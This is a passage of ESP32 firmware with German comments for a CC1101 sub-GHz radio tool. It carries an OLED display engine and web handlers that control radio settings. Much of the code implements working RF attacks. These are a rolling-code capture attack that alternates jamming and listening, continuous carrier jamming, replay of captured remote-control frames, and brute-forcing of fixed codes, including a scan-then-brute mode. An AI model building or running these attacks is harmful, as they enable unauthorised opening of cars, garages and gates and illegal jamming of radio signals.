      ELECHOUSE_cc1101.setPktFormat(0);
      ELECHOUSE_cc1101.SetRx();
      Serial.println("ROLLING -> RX");
    }
  } else {
    // --- RX-Phase ---
    if (ELECHOUSE_cc1101.CheckReceiveFlag()) {
      if (ELECHOUSE_cc1101.CheckCRC()) {
        int len = ELECHOUSE_cc1101.ReceiveData(ccreceivingbuffer);
        if (len > 0 && len <= CCBUFFERSIZE && rollingState.captureCount < rollingState.maxCaptures) {
          CapturedRollingCode &c = rollingState.codes[rollingState.captureCount];
          memcpy(c.data, ccreceivingbuffer, len);
          c.length = len;
          c.rssi = ELECHOUSE_cc1101.getRssi();
          c.timestamp = now;
          c.valid = true;
          c.replayed = false;
          Serial.printf("ROLLING Code %d gefangen %d Bytes RSSI:%d\n",
                        rollingState.captureCount + 1, len, c.rssi);
          rollingState.captureCount++;
          if (rollingState.captureCount >= rollingState.maxCaptures) {
            stopRollingCodeAttack();
            return;
          }
        }
      }
      ELECHOUSE_cc1101.SetRx();
    }

    if (elapsed >= rollingState.rxWindow) {
      rollingState.totalRxTime += elapsed;
      rollingState.jamming = true;
      rollingState.lastSwitch = now;
      ELECHOUSE_cc1101.setCCMode(0);
      ELECHOUSE_cc1101.setPktFormat(3);
      ELECHOUSE_cc1101.SetTx();
      pinMode(gdo0, OUTPUT);
      digitalWrite(gdo0, HIGH);
      Serial.println("ROLLING -> JAM");
    }
  }
}


// ═══════════════════════════════════════════════════════════════
// OLED DISPLAY ENGINE
// ═══════════════════════════════════════════════════════════════
DisplayMode getDisplayMode() {
  if (otaState.active) return DISP_OTA;
  if (stbState.active) return DISP_STB;
  if (bruteState.running) return DISP_BRUTE;
  if (rollingState.active) return DISP_ROLLING;
  if (currentMode == MODE_JAM) return DISP_JAM;
  if (currentMode == MODE_SCAN) return DISP_SCAN;
  if (currentMode == MODE_SPECTRUM) return DISP_SPECTRUM;
  if (currentMode == MODE_RX || currentMode == MODE_REC || currentMode == MODE_RAW_RX || currentMode == MODE_RAW_REC)
    return DISP_RX;
  return DISP_IDLE;
}

void drawProgressBar(int x, int y, int w, int h, int pct) {
  pct = constrain(pct, 0, 100);
  display.drawRect(x, y, w, h, SSD1306_WHITE);
  int fill = (w - 2) * pct / 100;
  if (fill > 0) display.fillRect(x + 1, y + 1, fill, h - 2, SSD1306_WHITE);
}

void drawSignalBar(int x, int y, int w, int h, int rssi) {
  int pct = map(constrain(rssi, -100, -30), -100, -30, 0, 100);
  drawProgressBar(x, y, w, h, pct);
}

void drawIdleScreen() {
  display.setCursor(0, 0);
  display.print("CC1101 PRO v0.8.1");
  display.drawLine(0, 10, 128, 10, SSD1306_WHITE);

  display.setCursor(0, 13);
  display.print("F:");
  display.print(current_freq, 2);
  display.print(" ");
  display.print(getModulationName(current_modulation));

  display.setCursor(0, 23);
  display.print("PA:");
  display.print(current_power);
  display.print("dBm  CH:");
  display.println(current_channel);

  display.setCursor(0, 33);
  display.print("RSSI:");
  display.print(lastRSSI);
  display.print(" NF:");
  display.println(noiseFloor);

  display.setCursor(0, 43);
  display.print("Fr:");
  display.print(frameCount);
  display.print("/");
  display.print(MAX_FRAMES);
  display.print(" RAM:");
  display.print((ESP.getFreeHeap() * 100) / ESP.getHeapSize());
  display.println("%");

  display.setCursor(0, 53);
  display.print(wifiMode == "AP" ? "AP " : "STA ");
  display.print(formatUptime((millis() - systemStartTime) / 1000));
}

void drawRXScreen() {
  display.setCursor(0, 0);
  if (currentMode == MODE_REC) display.print("* REC ");
  else if (currentMode == MODE_RAW_RX) display.print("! RAW RX");
  else if (currentMode == MODE_RAW_REC) display.print("! RAW REC");
  else display.print("O RX ");
  display.println(String(current_freq, 2) + "MHz");
  display.drawLine(0, 10, 128, 10, SSD1306_WHITE);

  display.setCursor(0, 13);
  display.print("RSSI: ");
  display.print(lastRSSI);
  display.println(" dBm");

  drawSignalBar(0, 23, 128, 8, lastRSSI);

  display.setCursor(0, 35);
  display.print("Frames: ");
  display.print(frameCount);
  display.print("/");
  display.println(MAX_FRAMES);

  display.setCursor(0, 45);
  display.print("SNR: ");
  display.print(lastRSSI - noiseFloor);
  display.println(" dB");

  display.setCursor(0, 55);
  display.print("Total RX: ");
  display.println(stats.totalRX);
}

void drawBruteScreen() {
  display.setCursor(0, 0);
  display.print("BRUTE: ");
  display.println(bruteState.protocol.name);
  display.drawLine(0, 10, 128, 10, SSD1306_WHITE);

  display.setCursor(0, 13);
  display.print(bruteState.bitCount);
  display.print("bit @ ");
  display.print(current_freq, 2);
  display.println("MHz");

  uint8_t prog = (bruteState.totalCodes > 0)
                   ? (uint8_t)(bruteState.currentCode * 100UL / bruteState.totalCodes)
                   : 0;
  drawProgressBar(0, 24, 128, 8, prog);

  display.setCursor(0, 35);
  display.print("0x");
  display.print(bruteState.currentCode, HEX);
  display.print("/0x");
  display.println(bruteState.endCode, HEX);

  display.setCursor(0, 45);
  display.print(bruteState.codesPerSecond);
  display.print(" c/s  ");
  display.print(prog);
  display.println("%");

  display.setCursor(0, 55);
  if (bruteState.paused) display.println("[ PAUSIERT ]");
  else {
    unsigned long elapsed = (millis() - bruteState.startTime) / 1000;
    display.print("Zeit: ");
    display.println(formatUptime(elapsed));
  }
}

void drawSTBScreen() {
  display.setCursor(0, 0);
  switch (stbState.phase) {
    case STB_SCANNING: display.print("STB: SCANNING"); break;
    case STB_SCAN_COMPLETE: display.print("STB: SCAN OK"); break;
    case STB_BRUTE_STARTING: display.print("STB: STARTING"); break;
    case STB_BRUTE_RUNNING: display.print("STB: BRUTING"); break;
    case STB_COMPLETE: display.print("STB: FERTIG"); break;
    default: display.print("STB: IDLE"); break;
  }
  display.drawLine(0, 10, 128, 10, SSD1306_WHITE);

  if (stbState.phase == STB_SCANNING) {
    display.setCursor(0, 13);
    display.print(stbState.scanCurrent, 2);
    display.println(" MHz");

    int scanProg = (stbState.scanTotalSteps > 0)
                     ? stbState.scanCurrentStep * 100 / stbState.scanTotalSteps
                     : 0;
    drawProgressBar(0, 24, 128, 8, scanProg);

    display.setCursor(0, 35);
    display.print("Best: ");
    display.print(stbState.scanBestFreq, 2);
    display.print(" MHz");

    display.setCursor(0, 45);
    display.print("RSSI: ");
    display.print(stbState.scanBestRSSI);
    display.println(" dBm");

    display.setCursor(0, 55);
    display.print(scanProg);
    display.println("% Scan");

  } else if (stbState.phase == STB_BRUTE_RUNNING && bruteState.running) {
    display.setCursor(0, 13);
    display.print(stbState.scanBestFreq, 2);
    display.print(" MHz (");
    display.print(stbState.scanBestRSSI);
    display.println("dB)");

    uint8_t prog = (bruteState.totalCodes > 0)
                     ? (uint8_t)(bruteState.currentCode * 100UL / bruteState.totalCodes)
                     : 0;
    drawProgressBar(0, 24, 128, 8, prog);

    display.setCursor(0, 35);
    display.print("0x");
    display.println(bruteState.currentCode, HEX);

    display.setCursor(0, 45);
    display.print(bruteState.codesPerSecond);
    display.print(" c/s ");
    display.print(prog);
    display.println("%");
  }
}

void drawRollingScreen() {
  display.setCursor(0, 0);
  display.println("ROLLING JAM");
  display.drawLine(0, 10, 128, 10, SSD1306_WHITE);

  display.setCursor(0, 13);
  display.print(rollingState.frequency, 2);
  display.println(" MHz");

  display.setCursor(0, 23);
  display.print(rollingState.jamming ? "> JAMMING  " : "O LISTEN   ");
  display.print(rollingState.captureCount);
  display.print("/");
  display.println(rollingState.maxCaptures);

  drawProgressBar(0, 34, 128, 8,
                  (rollingState.maxCaptures > 0)
                    ? rollingState.captureCount * 100 / rollingState.maxCaptures
                    : 0);

  display.setCursor(0, 46);
  for (int i = 0; i < rollingState.captureCount; i++) {
    display.print("*");
  }
  for (int i = rollingState.captureCount; i < rollingState.maxCaptures; i++) {
    display.print("o");
  }

  display.setCursor(0, 56);
  unsigned long elapsed = (millis() - rollingState.attackStartTime) / 1000;
  display.print("Zeit: ");
  display.println(formatUptime(elapsed));
}

void drawJamScreen() {
  display.setCursor(0, 0);
  display.println("! JAM MODE !");
  display.drawLine(0, 10, 128, 10, SSD1306_WHITE);

  display.setCursor(0, 13);
  display.print(current_freq, 2);
  display.println(" MHz");

  display.setTextSize(2);
  display.setCursor(10, 28);
  display.println("JAMMING");
  display.setTextSize(1);

  display.setCursor(0, 54);
  unsigned long d = (millis() - systemStartTime) / 1000;
  display.print("Zeit: ");
  display.println(formatUptime(d));
}

void drawScanScreen() {
  display.setCursor(0, 0);
  display.println("FREQ SCAN");
  display.drawLine(0, 10, 128, 10, SSD1306_WHITE);

  display.setCursor(0, 13);
  display.print("Aktuell: ");
  display.print(current_freq, 2);
  display.println("MHz");

  display.setCursor(0, 23);
  display.print("Peak: ");
  display.print(peakFreq, 2);
  display.println("MHz");

  display.setCursor(0, 33);
  display.print("RSSI: ");
  display.print(lastRSSI);
  display.print(" Peak:");
  display.println(peakRSSI);

  drawSignalBar(0, 45, 128, 8, lastRSSI);
}

void drawSpectrumScreen() {
  display.setCursor(0, 0);
  display.println("SPEKTRUM");
  display.drawLine(0, 10, 128, 10, SSD1306_WHITE);

  if (!spectrumData.valid || spectrumData.count == 0) {
    display.setCursor(20, 30);
    display.println("Keine Daten");
    return;
  }

  int graphX = 0, graphY = 14, graphW = 128, graphH = 48;
  int minRSSI = -120, maxRSSI = -20;

  for (int i = 0; i < spectrumData.count && i < graphW; i++) {
    int rssi = spectrumData.points[i];
    int barH = map(constrain(rssi, minRSSI, maxRSSI), minRSSI, maxRSSI, 0, graphH);
    int x = graphX + i * graphW / spectrumData.count;
    int y = graphY + graphH - barH;
    display.drawFastVLine(x, y, barH, SSD1306_WHITE);
  }

  // Peak markieren
  int peakIdx = 0;
  for (int i = 1; i < spectrumData.count; i++)
    if (spectrumData.points[i] > spectrumData.points[peakIdx]) peakIdx = i;

  float peakF = spectrumData.startFreq + (float)peakIdx / spectrumData.count * (spectrumData.stopFreq - spectrumData.startFreq);
  display.setCursor(0, 57);
  display.print("Peak:");
  display.print(peakF, 1);
  display.println("MHz");
}

void drawOTAScreen() {
  display.setCursor(0, 0);
  display.println("OTA UPDATE");
  display.drawLine(0, 10, 128, 10, SSD1306_WHITE);

  display.setCursor(0, 20);
  if (otaState.success) {
    display.println("OK ERFOLG!");
    display.setCursor(0, 35);
    display.println("Neustart...");
  } else if (otaState.error.length() > 0) {
    display.println("ERR FEHLER:");
    display.setCursor(0, 35);
    display.println(otaState.error);
  } else {
    display.print("Schreibe... ");
    display.print(otaState.progress);
    display.println("%");
    drawProgressBar(0, 35, 128, 10, otaState.progress);
    display.setCursor(0, 52);
    display.print(otaState.written / 1024);
    display.print("/");
    display.print(otaState.totalSize / 1024);
    display.println(" KB");
  }
}

void updateDisplay() {
  if (!displayEnabled) return;
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  switch (getDisplayMode()) {
    case DISP_RX: drawRXScreen(); break;
    case DISP_BRUTE: drawBruteScreen(); break;
    case DISP_STB: drawSTBScreen(); break;
    case DISP_ROLLING: drawRollingScreen(); break;
    case DISP_JAM: drawJamScreen(); break;
    case DISP_SCAN: drawScanScreen(); break;
    case DISP_SPECTRUM: drawSpectrumScreen(); break;
    case DISP_OTA: drawOTAScreen(); break;
    default: drawIdleScreen(); break;
  }
  display.display();
}
// ═══════════════════════════════════════════════════════════════
// HTML - KOMPLETT ALLE 10 TABS
// ═══════════════════════════════════════════════════════════════
//teil6
// ═══════════════════════════════════════════════════════════════
// HTTP HANDLER - ROOT
// ═══════════════════════════════════════════════════════════════
void handleRoot() {
  server.sendHeader("Cache-Control", "no-cache");
  server.send_P(200, "text/html", HTML_PAGE);
}

// ═══════════════════════════════════════════════════════════════
// FREQUENZ / MOD / POWER / BASIS
// ═══════════════════════════════════════════════════════════════
void handleSetFreq() {
  if (!server.hasArg("freq")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_freq = server.arg("freq").toFloat();
  ELECHOUSE_cc1101.setMHZ(current_freq);
  server.send(200, "text/plain", "OK freq=" + String(current_freq, 2));
}
void handleSetMod() {
  if (!server.hasArg("mod")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_modulation = server.arg("mod").toInt();
  ELECHOUSE_cc1101.setModulation(current_modulation);
  server.send(200, "text/plain", "OK mod=" + String(current_modulation));
}
void handleSetPower() {
  if (!server.hasArg("power")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_power = server.arg("power").toInt();
  ELECHOUSE_cc1101.setPA(current_power);
  server.send(200, "text/plain", "OK power=" + String(current_power));
}
void handleSetDev() {
  if (!server.hasArg("dev")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_deviation = server.arg("dev").toFloat();
  ELECHOUSE_cc1101.setDeviation(current_deviation);
  server.send(200, "text/plain", "OK dev=" + String(current_deviation));
}
void handleSetDataRate() {
  if (!server.hasArg("drate")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_datarate = server.arg("drate").toFloat();
  ELECHOUSE_cc1101.setDRate(current_datarate);
  server.send(200, "text/plain", "OK drate=" + String(current_datarate));
}
void handleSetChannel() {
  if (!server.hasArg("ch")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_channel = server.arg("ch").toInt();
  ELECHOUSE_cc1101.setChannel(current_channel);
  server.send(200, "text/plain", "OK ch=" + String(current_channel));
}
void handleSetRxBW() {
  if (!server.hasArg("rxbw")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_rxbw = server.arg("rxbw").toFloat();
  ELECHOUSE_cc1101.setRxBW(current_rxbw);
  server.send(200, "text/plain", "OK rxbw=" + String(current_rxbw));
}
void handleSetSyncMode() {
  if (!server.hasArg("syncmode")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_syncmode = server.arg("syncmode").toInt();
  ELECHOUSE_cc1101.setSyncMode(current_syncmode);
  server.send(200, "text/plain", "OK syncmode=" + String(current_syncmode));
}
void handleSetSyncWordH() {
  if (!server.hasArg("syncwordh")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_syncword_high = server.arg("syncwordh").toInt();
  ELECHOUSE_cc1101.setSyncWord(current_syncword_high, current_syncword_low);
  server.send(200, "text/plain", "OK synch=" + String(current_syncword_high));
}
void handleSetSyncWordL() {
  if (!server.hasArg("syncwordl")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_syncword_low = server.arg("syncwordl").toInt();
  ELECHOUSE_cc1101.setSyncWord(current_syncword_high, current_syncword_low);
  server.send(200, "text/plain", "OK syncl=" + String(current_syncword_low));
}
void handleSetPktFormat() {
  if (!server.hasArg("pktformat")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_pktformat = server.arg("pktformat").toInt();
  ELECHOUSE_cc1101.setPktFormat(current_pktformat);
  server.send(200, "text/plain", "OK pktformat=" + String(current_pktformat));
}
void handleSetLengthConfig() {
  if (!server.hasArg("lencfg")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_lengthconfig = server.arg("lencfg").toInt();
  ELECHOUSE_cc1101.setLengthConfig(current_lengthconfig);
  server.send(200, "text/plain", "OK lencfg=" + String(current_lengthconfig));
}
void handleSetCrc() {
  if (!server.hasArg("crc")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_crc = server.arg("crc").toInt();
  ELECHOUSE_cc1101.setCrc(current_crc);
  server.send(200, "text/plain", "OK crc=" + String(current_crc));
}
void handleSetManchester() {
  if (!server.hasArg("manch")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_manchester = server.arg("manch").toInt();
  ELECHOUSE_cc1101.setManchester(current_manchester);
  server.send(200, "text/plain", "OK manch=" + String(current_manchester));
}
void handleSetFEC() {
  if (!server.hasArg("fec")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_fec = server.arg("fec").toInt();
  ELECHOUSE_cc1101.setFEC(current_fec);
  server.send(200, "text/plain", "OK fec=" + String(current_fec));
}
void handleSetWhiteData() {
  if (!server.hasArg("white")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_whitedata = server.arg("white").toInt();
  ELECHOUSE_cc1101.setWhiteData(current_whitedata);
  server.send(200, "text/plain", "OK white=" + String(current_whitedata));
}
void handleSetDCFilter() {
  if (!server.hasArg("dcf")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_dcfilteroff = server.arg("dcf").toInt();
  ELECHOUSE_cc1101.setDcFilterOff(current_dcfilteroff);
  server.send(200, "text/plain", "OK dcf=" + String(current_dcfilteroff));
}
void handleSetAppendStatus() {
  if (!server.hasArg("appst")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  current_appendstatus = server.arg("appst").toInt();
  ELECHOUSE_cc1101.setAppendStatus(current_appendstatus);
  server.send(200, "text/plain", "OK appst=" + String(current_appendstatus));
}

// ═══════════════════════════════════════════════════════════════
// TX / RX / REC / JAM
// ═══════════════════════════════════════════════════════════════
void handleTX() {
  if (!server.hasArg("data")) {
    server.send(400, "text/plain", "ERR");
    return;
  }
  String hexStr = server.arg("data");
  int len = hexStr.length() / 2;
  if (len == 0 || len > CCBUFFERSIZE) {
    server.send(400, "text/plain", "ERR_LEN");
    return;
  }
  hextoascii(ccsendingbuffer, (byte *)hexStr.c_str(), hexStr.length());
  ELECHOUSE_cc1101.SendData(ccsendingbuffer, len);
  stats.totalTX++;
  ELECHOUSE_cc1101.SetRx();
  server.send(200, "text/plain", "OK tx=" + String(len) + "B");
}
void handleRX() {
  if (currentMode == MODE_RX) {
    currentMode = MODE_IDLE;
    ELECHOUSE_cc1101.setSidle();
    server.send(200, "text/plain", "OFF");
  } else {
    currentMode = MODE_RX;
    cc1101initialize();
    ELECHOUSE_cc1101.SetRx();
    server.send(200, "text/plain", "ON");
  }
}
void handleREC() {
  if (currentMode == MODE_REC) {
    currentMode = MODE_IDLE;
    ELECHOUSE_cc1101.setSidle();
    server.send(200, "text/plain", "OFF");
  } else {
    currentMode = MODE_REC;
    cc1101initialize();
    ELECHOUSE_cc1101.SetRx();
    server.send(200, "text/plain", "ON");
  }
}
void handleJam() {
  currentMode = MODE_JAM;
  ELECHOUSE_cc1101.setCCMode(0);
  ELECHOUSE_cc1101.setPktFormat(3);
  ELECHOUSE_cc1101.SetTx();
  pinMode(gdo0, OUTPUT);
  digitalWrite(gdo0, HIGH);
  server.send(200, "text/plain", "OK jam=ON");
}
void handleStopJam() {
  if (currentMode == MODE_JAM) currentMode = MODE_IDLE;
  digitalWrite(gdo0, LOW);
  ELECHOUSE_cc1101.setCCMode(1);
  ELECHOUSE_cc1101.setPktFormat(0);
  ELECHOUSE_cc1101.setSidle();
  server.send(200, "text/plain", "OK jam=OFF");
}
void handleGetData() {
  if (lastReceivedData.length() == 0) {
    server.send(200, "text/plain", "NONE");
  } else {
    String d = lastReceivedData;
    server.send(200, "text/plain", d);
  }
}

// ═══════════════════════════════════════════════════════════════
// RAW
// ═══════════════════════════════════════════════════════════════
void handleRawRX() {
  bigrecordingbufferindex = 0;
  currentMode = MODE_RAW_RX;
  cc1101initialize();
  ELECHOUSE_cc1101.SetRx();
  server.send(200, "text/plain", "OK rawrx=ON");
}
void handleRawREC() {
  bigrecordingbufferindex = 0;
  currentMode = MODE_RAW_REC;
  cc1101initialize();
  ELECHOUSE_cc1101.SetRx();
  server.send(200, "text/plain", "OK rawrec=ON");
}
void handleRawStop() {
  if (currentMode == MODE_RAW_RX || currentMode == MODE_RAW_REC)
    currentMode = MODE_IDLE;
  ELECHOUSE_cc1101.setSidle();
  server.send(200, "text/plain", "OK raw=OFF");
}
void handleGetRawData() {
  if (bigrecordingbufferindex == 0) {
    server.send(200, "text/plain", "");
    return;
  }
  String result = byteToHexString(bigrecordingbuffer, bigrecordingbufferindex);
  server.send(200, "text/plain", result);
}
void handleClearRawBuffer() {
  bigrecordingbufferindex = 0;
  memset(bigrecordingbuffer, 0, RECORDINGBUFFERSIZE);
  server.send(200, "text/plain", "OK");
}

// ═══════════════════════════════════════════════════════════════
// FRAME HANDLER
// ═══════════════════════════════════════════════════════════════
void handleGetFrames() {
  String json = "[";
  for (int i = 0; i < frameCount; i++) {
    if (i > 0) json += ",";
    json += "{";
    json += "\"idx\":" + String(i) + ",";
    json += "\"length\":" + String(frames[i].length) + ",";
    json += "\"rssi\":" + String(frames[i].rssi) + ",";
    json += "\"freq\":" + String(frames[i].frequency, 2) + ",";
    json += "\"ts\":" + String(frames[i].timestamp) + ",";
    json += "\"hex\":\"" + byteToHexString(frames[i].data, frames[i].length) + "\",";
    json += "\"protocol\":\"" + String(frames[i].protocol) + "\",";
    json += "\"confidence\":" + String(frames[i].confidence) + ",";
    json += "\"code\":" + String(frames[i].decodedCode) + ",";
    json += "\"bits\":" + String(frames[i].decodedBits) + "}";
  }
  json += "]";
  server.send(200, "application/json", json);
}
void handleGetFrame() {
  int idx = server.hasArg("idx") ? server.arg("idx").toInt() : 0;
  if (idx < 0 || idx >= frameCount) {
    server.send(404, "text/plain", "NOT_FOUND");
    return;
  }
  Frame &f = frames[idx];
  String json = "{";
  json += "\"length\":" + String(f.length) + ",";
  json += "\"rssi\":" + String(f.rssi) + ",";
  json += "\"freq\":" + String(f.frequency, 2) + ",";
  json += "\"timestamp\":" + String(f.timestamp) + ",";
  json += "\"hex\":\"" + byteToHexString(f.data, f.length) + "\",";
  json += "\"protocol\":\"" + String(f.protocol) + "\",";
  json += "\"confidence\":" + String(f.confidence) + ",";
  json += "\"code\":" + String(f.decodedCode) + ",";
  json += "\"bits\":" + String(f.decodedBits) + "}";
  server.send(200, "application/json", json);
}
void handleReplayFrame() {
  int idx = server.hasArg("idx") ? server.arg("idx").toInt() : 0;
  int rep = server.hasArg("repeat") ? server.arg("repeat").toInt() : 5;
  int del = server.hasArg("delay") ? server.arg("delay").toInt() : 100;
  if (idx < 0 || idx >= frameCount) {
    server.send(404, "text/plain", "NOT_FOUND");
    return;
  }
  for (int i = 0; i < rep; i++) {
    ELECHOUSE_cc1101.SendData(frames[idx].data, frames[idx].length);
    stats.totalTX++;
    if (del > 0) delay(del);
  }
  ELECHOUSE_cc1101.SetRx();
  server.send(200, "text/plain", "OK idx=" + String(idx) + " x" + String(rep));
}
void handleReplayAll() {
  for (int i = 0; i < frameCount; i++) {
    ELECHOUSE_cc1101.SendData(frames[i].data, frames[i].length);
    stats.totalTX++;
    delay(200);
  }
  ELECHOUSE_cc1101.SetRx();
  server.send(200, "text/plain", "OK all=" + String(frameCount));
}
void handleClearFrames() {
  frameCount = 0;
  memset(frames, 0, sizeof(frames));
  server.send(200, "text/plain", "OK");
}
void handleDeleteFrame() {
  int idx = server.hasArg("idx") ? server.arg("idx").toInt() : -1;
  if (idx < 0 || idx >= frameCount) {
    server.send(404, "text/plain", "NOT_FOUND");
    return;
  }
  for (int i = idx; i < frameCount - 1; i++) frames[i] = frames[i + 1];
  frameCount--;
  server.send(200, "text/plain", "OK deleted=" + String(idx));
}
void handleAnalyze() {
  if (frameCount == 0) {
    server.send(200, "application/json", "{\"protocol\":\"NONE\",\"confidence\":0,\"code\":0,\"bits\":0}");
    return;
  }
  analyzeCapturedFrame(frameCount - 1);
  Frame &f = frames[frameCount - 1];
  String json = "{\"protocol\":\"" + String(f.protocol) + "\",";
  json += "\"confidence\":" + String(f.confidence) + ",";
  json += "\"code\":" + String(f.decodedCode) + ",";
  json += "\"bits\":" + String(f.decodedBits) + "}";
  server.send(200, "application/json", json);
}
void handleAnalyzeFrame() {
  int idx = server.hasArg("frame") ? server.arg("frame").toInt() : 0;
  if (idx < 0 || idx >= frameCount) {
    server.send(404, "text/plain", "NOT_FOUND");
    return;
  }
  analyzeCapturedFrame(idx);
  Frame &f = frames[idx];
  String json = "{\"protocol\":\"" + String(f.protocol) + "\",";
  json += "\"confidence\":" + String(f.confidence) + ",";
  json += "\"code\":" + String(f.decodedCode) + ",";
  json += "\"bits\":" + String(f.decodedBits) + "}";
  server.send(200, "application/json", json);
}

// ═══════════════════════════════════════════════════════════════
// CALIBRATE / SCAN / SPECTRUM
// ═══════════════════════════════════════════════════════════════
void handleCalibrate() {
  noiseFloor = 0;
  for (int i = 0; i < 20; i++) {
    noiseFloor += ELECHOUSE_cc1101.getRssi();
    delay(10);
  }
  noiseFloor /= 20;
  noiseFloor -= 3;
  String json = "{\"noise\":" + String(noiseFloor) + "}";
  server.send(200, "application/json", json);
}

static float scanCurrentFreq_h = 433.0;
static float scanBestFreq_h = 433.0;
static int scanBestRSSI_h = -120;

void handleScanStep() {
  float start = server.hasArg("start") ? server.arg("start").toFloat() : 433.0;
  float stop = server.hasArg("stop") ? server.arg("stop").toFloat() : 434.0;

  static float lastStart = -1;
  if (lastStart != start) {
    scanCurrentFreq_h = start;
    scanBestFreq_h = start;
    scanBestRSSI_h = -120;
    lastStart = start;
    currentMode = MODE_SCAN;
  }

  ELECHOUSE_cc1101.setMHZ(scanCurrentFreq_h);
  delay(3);
  int rssi = ELECHOUSE_cc1101.getRssi();
  lastRSSI = rssi;
  updateRSSIHistory(rssi);

  if (rssi > scanBestRSSI_h) {
    scanBestRSSI_h = rssi;
    scanBestFreq_h = scanCurrentFreq_h;
  }

  bool complete = (scanCurrentFreq_h >= stop);
  float cur = scanCurrentFreq_h;
  scanCurrentFreq_h += 0.01f;
  if (complete) {
    currentMode = MODE_IDLE;
    scanCurrentFreq_h = start;
    ELECHOUSE_cc1101.setMHZ(current_freq);
  }

  String json = "{\"freq\":" + String(cur, 2) + ",\"rssi\":" + String(rssi) + ",\"bestFreq\":" + String(scanBestFreq_h, 2) + ",\"best\":" + String(scanBestRSSI_h) + ",\"complete\":" + String(complete ? "true" : "false") + "}";
  server.send(200, "application/json", json);
}

void handleSpectrum() {
  float start = server.hasArg("start") ? server.arg("start").toFloat() : 433.0;
  float stop = server.hasArg("stop") ? server.arg("stop").toFloat() : 434.0;
  int pts = MAX_SPECTRUM_POINTS;
  float step = (stop - start) / pts;

  spectrumData.startFreq = start;
  spectrumData.stopFreq = stop;
  spectrumData.count = 0;
  spectrumData.valid = false;
  currentMode = MODE_SPECTRUM;

  String json = "{\"data\":[";
  for (int i = 0; i < pts; i++) {
    float f = start + i * step;
    ELECHOUSE_cc1101.setMHZ(f);
    delay(2);
    int rssi = ELECHOUSE_cc1101.getRssi();
    spectrumData.points[i] = rssi;
    spectrumData.count++;
    if (i > 0) json += ",";
    json += String(rssi);
    if (i % 10 == 0) yield();
  }
  json += "]}";
  spectrumData.valid = true;
  currentMode = MODE_IDLE;
  ELECHOUSE_cc1101.setMHZ(current_freq);
  server.send(200, "application/json", json);
}

// ═══════════════════════════════════════════════════════════════
// BRUTE FORCE HANDLER
// ═══════════════════════════════════════════════════════════════
void handleBruteStart() {
  uint8_t proto = server.hasArg("proto") ? server.arg("proto").toInt() : 0;
  uint8_t bits = server.hasArg("bits") ? server.arg("bits").toInt() : 24;
  uint32_t start = server.hasArg("start") ? (uint32_t)server.arg("start").toInt() : 0;
  uint32_t end = server.hasArg("end") ? (uint32_t)server.arg("end").toInt() : 0;
  uint8_t rep = server.hasArg("repeat") ? server.arg("repeat").toInt() : 5;
  uint16_t del = server.hasArg("delay") ? server.arg("delay").toInt() : 100;
  uint8_t chunk = server.hasArg("chunk") ? server.arg("chunk").toInt() : 10;
  if (proto >= PROTOCOL_COUNT) proto = 0;
  initBruteForce(proto, bits, start, end, rep, del, chunk, false);
  server.send(200, "text/plain", "OK brute=START");
}
void handleBrutePause() {
  if (bruteState.paused) resumeBruteForce();
  else pauseBruteForce();
  server.send(200, "text/plain", bruteState.paused ? "PAUSED" : "RESUMED");
}
void handleBruteStop() {
  stopBruteForce();
  server.send(200, "text/plain", "OK brute=STOP");
}
void handleBruteProgress() {
  uint8_t prog = (bruteState.totalCodes > 0)
                   ? (uint8_t)(bruteState.currentCode * 100UL / bruteState.totalCodes)
                   : 0;
  String json = "{";
  json += "\"running\":" + String(bruteState.running ? "true" : "false") + ",";
  json += "\"paused\":" + String(bruteState.paused ? "true" : "false") + ",";
  json += "\"current\":" + String(bruteState.currentCode) + ",";
  json += "\"total\":" + String(bruteState.totalCodes) + ",";
  json += "\"speed\":" + String(bruteState.codesPerSecond) + ",";
  json += "\"progress\":" + String(prog) + ",";
  json += "\"sent\":" + String(bruteState.totalSent) + ",";
  json += "\"protocol\":\"" + String(bruteState.protocol.name) + "\",";
  json += "\"bits\":" + String(bruteState.bitCount) + "}";
  server.send(200, "application/json", json);
}
void handleBruteFromFrame() {
  int idx = server.hasArg("frame") ? server.arg("frame").toInt() : 0;
  uint32_t range = server.hasArg("range") ? (uint32_t)server.arg("range").toInt() : 100;
  bruteFromCapturedFrame(idx, range);
  server.send(200, "text/plain", "OK smartbrute=START");
}

// ═══════════════════════════════════════════════════════════════
// STB HANDLER
// ═══════════════════════════════════════════════════════════════
void handleSTBStart() {
  float scanStart = server.hasArg("scanStart") ? server.arg("scanStart").toFloat() : 433.0;
  float scanStop = server.hasArg("scanStop") ? server.arg("scanStop").toFloat() : 434.0;
  uint8_t proto = server.hasArg("protocol") ? server.arg("protocol").toInt() : 0;
  uint8_t bits = server.hasArg("bits") ? server.arg("bits").toInt() : 24;
  uint8_t rep = server.hasArg("repeat") ? server.arg("repeat").toInt() : 5;
  uint16_t del = server.hasArg("delay") ? server.arg("delay").toInt() : 100;
  if (proto >= PROTOCOL_COUNT) proto = 0;
  initScanThenBrute(scanStart, scanStop, proto, bits, rep, del);
  server.send(200, "text/plain", "OK stb=START");
}
void handleSTBPause() {
  if (stbState.paused) resumeScanThenBrute();
  else pauseScanThenBrute();
  server.send(200, "text/plain", stbState.paused ? "PAUSED" : "RESUMED");
}
void handleSTBStop() {
  stopScanThenBrute();
  server.send(200, "text/plain", "OK stb=STOP");
}
void handleSTBProgress() {
  int scanProg = (stbState.scanTotalSteps > 0)
                   ? stbState.scanCurrentStep * 100 / stbState.scanTotalSteps
